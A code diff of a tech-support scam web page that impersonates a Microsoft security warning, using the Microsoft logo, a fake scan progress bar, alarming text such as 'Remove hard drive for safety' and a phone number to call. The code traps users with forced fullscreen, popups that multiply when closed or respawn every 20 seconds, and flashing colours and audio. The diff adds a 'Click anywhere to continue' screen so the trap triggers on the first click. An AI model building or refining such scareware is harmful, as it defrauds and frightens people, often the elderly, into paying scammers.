@@ -7,10 +7,27 @@
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background: #1a1a1a;
+      background: #000;
       color: #fff;
-      transition: background 0.3s ease;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
     }
+    .start-screen {
+      font-size: 28px;
+      font-weight: bold;
+      animation: blink 1.5s infinite;
+      cursor: pointer;
+    }
+    @keyframes blink {
+      0% { color: #fff; }
+      50% { color: red; }
+      100% { color: #fff; }
+    }
+
+    /* === POPUP STYLES === */
     .popup-container {
       position: fixed;
       background: #2b2b2b;
@@ -24,120 +41,33 @@
       padding: 10px;
       animation: zoomIn 0.5s ease;
     }
-    .popup {
-      display: flex;
-      flex-direction: row;
-    }
-    .left-panel, .right-panel {
-      padding: 20px;
-      flex: 1;
-    }
-    .sad-face {
-      font-size: 50px;
-      margin-bottom: 10px;
-    }
-    .main-message {
-      font-size: 16px;
-      margin-bottom: 20px;
-    }
-    .qr-block {
-      text-align: center;
-      margin-top: 15px;
-    }
-    .qr-block img {
-      width: 180px;
-    }
-    /* Microsoft Logo (Grid Style + Text) */
-    .ms-logo {
-      display: flex;
-      align-items: center;
-      margin-bottom: 15px;
-    }
-    .ms-grid {
-      display: grid;
-      grid-template-columns: repeat(2, 18px);
-      grid-template-rows: repeat(2, 18px);
-      gap: 2px;
-    }
-    .ms-square {
-      width: 18px;
-      height: 18px;
-      display: inline-block;
-    }
-    .ms-red { background: red; }
-    .ms-green { background: green; }
-    .ms-blue { background: blue; }
-    .ms-yellow { background: yellow; }
-    .ms-text {
-      margin-left: 10px;
-      font-weight: bold;
-      font-size: 18px;
-    }
-    .warning-text {
-      font-size: 15px;
-      margin-bottom: 15px;
-      animation: blink 1.2s infinite;
-    }
-    @keyframes blink {
-      0% { color: #fff; }
-      50% { color: yellow; }
-      100% { color: #fff; }
-    }
-    .black-box {
-      background: black;
-      color: #fff;
-      padding: 10px;
-      margin-bottom: 15px;
-      text-align: center;
-    }
-    .scan-report {
-      background: #111;
-      padding: 10px;
-      border-radius: 5px;
-      text-align: center;
-    }
-    .scan-report .percent {
-      font-size: 18px;
-      margin-top: 5px;
-    }
-    .progress-bar {
-      width: 100%;
-      height: 10px;
-      background: #333;
-      border-radius: 5px;
-      margin-top: 10px;
-      overflow: hidden;
-    }
-    .progress-bar-fill {
-      width: 0%;
-      height: 100%;
-      background: lime;
-      transition: width 0.3s ease;
-    }
-    .close-btn {
-      background: red;
-      color: #fff;
-      border: none;
-      padding: 8px 15px;
-      cursor: pointer;
-      border-radius: 5px;
-      margin-top: 15px;
-    }
-    @keyframes zoomIn {
-      from { transform: scale(0.3); opacity: 0; }
-      to { transform: scale(1); opacity: 1; }
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: scale(0.7); }
-      to { opacity: 1; transform: scale(1); }
-    }
-    @keyframes rotateIn {
-      from { opacity: 0; transform: rotate(-200deg) scale(0.3); }
-      to { opacity: 1; transform: rotate(0) scale(1); }
-    }
+    .popup { display: flex; flex-direction: row; }
+    .left-panel, .right-panel { padding: 20px; flex: 1; }
+    .sad-face { font-size: 50px; margin-bottom: 10px; }
+    .main-message { font-size: 16px; margin-bottom: 20px; }
+    .qr-block { text-align: center; margin-top: 15px; }
+    .qr-block img { width: 180px; }
+    .ms-logo { display: flex; align-items: center; margin-bottom: 15px; }
+    .ms-grid { display: grid; grid-template-columns: repeat(2, 18px); grid-template-rows: repeat(2, 18px); gap: 2px; }
+    .ms-square { width: 18px; height: 18px; display: inline-block; }
+    .ms-red { background: red; } .ms-green { background: green; }
+    .ms-blue { background: blue; } .ms-yellow { background: yellow; }
+    .ms-text { margin-left: 10px; font-weight: bold; font-size: 18px; }
+    .warning-text { font-size: 15px; margin-bottom: 15px; animation: blink 1.2s infinite; }
+    .black-box { background: black; color: #fff; padding: 10px; margin-bottom: 15px; text-align: center; }
+    .scan-report { background: #111; padding: 10px; border-radius: 5px; text-align: center; }
+    .scan-report .percent { font-size: 18px; margin-top: 5px; }
+    .progress-bar { width: 100%; height: 10px; background: #333; border-radius: 5px; margin-top: 10px; overflow: hidden; }
+    .progress-bar-fill { width: 0%; height: 100%; background: lime; transition: width 0.3s ease; }
+    .close-btn { background: red; color: #fff; border: none; padding: 8px 15px; cursor: pointer; border-radius: 5px; margin-top: 15px; }
+    @keyframes zoomIn { from { transform: scale(0.3); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    @keyframes fadeIn { from { opacity: 0; transform: scale(0.7); } to { opacity: 1; transform: scale(1); } }
+    @keyframes rotateIn { from { opacity: 0; transform: rotate(-200deg) scale(0.3); } to { opacity: 1; transform: rotate(0) scale(1); } }
   </style>
 </head>
 <body>
+  <div class="start-screen">⚠ Click anywhere to continue...</div>
+
   <script>
     const animations = ['zoomIn', 'fadeIn', 'rotateIn'];
     const colors = ['#1a1a1a', '#222', '#330000', '#003300', '#000033', '#333300', '#660066', '#444'];
@@ -156,9 +86,7 @@
               Simply collect error information and the troubleshooting will be performed for you.
             </div>
             <div class="qr-block">
-              <!-- Microsoft Official Logo -->
-              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/512px-Microsoft_logo_%282012%29.svg.png" 
-                   alt="Microsoft Logo">
+              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/512px-Microsoft_logo_%282012%29.svg.png" alt="Microsoft Logo">
               <div class="qr-text">
                 For more information about this issue and the solution,<br>
                 Call: +1-805-362-0362<br><br>
@@ -183,16 +111,11 @@
               <strong>Your data is at high risk</strong><br>
               <span class="highlight-yellow">Remove hard drive for safety<br>It's starting soon ..</span>
             </div>
-            <div class="black-box">
-              Windows Contact Support<br>
-              +1-805-362-0362
-            </div>
+            <div class="black-box">Windows Contact Support<br>+1-805-362-0362</div>
             <div class="scan-report">
               <div class="label">Scan Report</div>
               <div class="percent">0%</div>
-              <div class="progress-bar">
-                <div class="progress-bar-fill"></div>
-              </div>
+              <div class="progress-bar"><div class="progress-bar-fill"></div></div>
             </div>
             <button class="close-btn">Close</button>
           </div>
@@ -201,13 +124,9 @@
 
       document.body.appendChild(popup);
 
-      // random position
       movePopupRandom(popup);
-
-      // background color flash
       flashBackground();
 
-      // progress bar
       let percent = 0;
       const percentEl = popup.querySelector('.percent');
       const fillEl = popup.querySelector('.progress-bar-fill');
@@ -221,7 +140,6 @@
         }
       }, 200);
 
-      // close button crazy mode
       popup.querySelector('.close-btn').addEventListener('click', () => {
         document.body.removeChild(popup);
         for (let i = 0; i < 5; i++) {
@@ -247,18 +165,19 @@
       audio.play();
     }
 
-    // Initial spawn
-    createPopup();
-
-    // auto spawn every 20s
-    setInterval(createPopup, 20000);
-
-    // Fullscreen trap
+    // start-screen click hone par hi popup system start hoga
     document.addEventListener("click", () => {
+      const start = document.querySelector(".start-screen");
+      if (start) start.remove();
+
+      createPopup();
+      setInterval(createPopup, 20000);
+
+      // Fullscreen trap
       if (!document.fullscreenElement) {
         document.documentElement.requestFullscreen().catch(()=>{});
       }
-    });
+    }, { once: true });
   </script>
 </body>
 </html>
